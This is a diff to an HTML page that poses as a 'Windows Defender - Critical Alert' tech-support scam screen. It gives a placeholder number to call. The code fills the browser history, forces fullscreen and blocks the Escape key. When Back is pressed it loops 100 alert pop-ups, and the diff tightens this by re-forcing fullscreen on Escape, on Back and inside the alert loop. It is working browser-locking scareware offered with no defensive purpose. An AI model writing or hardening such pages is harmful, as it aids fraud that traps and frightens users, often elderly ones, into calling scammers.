@@ -3,7 +3,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Security Lock - Fullscreen Trap</title>
+  <title>Ultimate Security Lock</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
@@ -40,56 +40,56 @@
     let alertFlood = true;
     let alertCount = 0;
 
-    // Fill history stack
     for (let i = 0; i < 100; i++) {
       history.pushState({}, '', location.href + '#' + i);
     }
 
-    // Force fullscreen on click
-    document.addEventListener("click", () => {
+    function forceFullscreen() {
       const el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
+      if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-    });
+    }
 
-    // Lock ESC key
+    document.addEventListener("click", forceFullscreen);
+
     document.addEventListener('keydown', function(e) {
       if (e.key === 'Escape') {
         e.preventDefault();
+        forceFullscreen();
       }
     });
 
-    // Handle back button
-    window.onpopstate = function () {
-      if (alertFlood) {
-        alertFlood = false;
-        showAlerts(0);
-      }
-    };
-
     function showAlerts(n) {
       if (n >= 100) {
-        alert("✅ You may now exit.");
+        alert("✅ You may now exit this security screen.");
         return;
       }
       setTimeout(() => {
+        forceFullscreen();
         alertCount++;
-        alert(`🚫 Alert ${alertCount}/100:
-Security lock in place.`);
+        alert(`🚫 Security Alert ${alertCount}/100:\nYou cannot leave this screen.`);
         history.pushState({}, '', location.href + '#' + Math.random());
         showAlerts(n + 1);
       }, 200);
     }
+
+    window.onpopstate = function () {
+      if (alertFlood) {
+        alertFlood = false;
+        forceFullscreen();
+        showAlerts(0);
+      }
+    };
   </script>
 </head>
 <body>
   <div class="overlay">
-    <h1>⚠️ Windows Defender - Critical Alert</h1>
-    <p>Your system is at risk.</p>
-    <p>Call support immediately: <strong>+1-800-FAKE-NUM</strong></p>
-    <p>Do not press back or close this screen.</p>
-    <p><strong>Full screen mode will remain locked until 100 warnings are shown.</strong></p>
-    <p>Tap anywhere to activate fullscreen.</p>
+    <h1>⚠️ Windows Defender - Critical Lock</h1>
+    <p>Your device is under threat!</p>
+    <p>Call Support Immediately: <strong>+1-800-FAKE-NUM</strong></p>
+    <p>Back navigation and exit are restricted for your safety.</p>
+    <p><strong>This screen will remain locked until 100 security alerts are acknowledged.</strong></p>
+    <p>Tap anywhere to activate fullscreen mode.</p>
   </div>
 </body>
 </html>
